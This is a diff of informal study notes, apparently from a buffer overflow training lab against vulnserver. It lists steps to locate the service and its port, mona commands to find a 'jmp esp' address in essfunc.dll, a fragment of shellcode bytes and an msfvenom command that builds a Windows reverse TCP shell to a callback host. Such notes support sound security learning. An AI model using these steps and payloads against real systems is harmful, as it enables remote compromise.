@@ -64,3 +64,28 @@ buf += b"\xb4\xda\x0b\x6c\x14\xad\xed\x5f\x1a"
 sometimes i have to regenerate my shell code by running msfvenom command
 ========================================================================================
 WINDOWS 
+
+C:\Users\student>tasklist /svc | findstr vulln
+
+C:\Users\student>tasklist /svc | findstr vuln
+vulnserver.exe                2984 N/A
+
+C:\Users\student>netstat -ano | findstr 2984
+  TCP    0.0.0.0:9999           0.0.0.0:0              LISTENING       2984
+
+
+
+
+
+
+
+
+
+
+
+in log data.  !mona modules  # list out all loadded dlls and protection 
+              !mona jmp -r esp -m "essfunc.dll" 
+              
+              copy clipboard address
+              
+        msfvenom -p windows/shell/reverse_tcp lhost =10.50.25.239
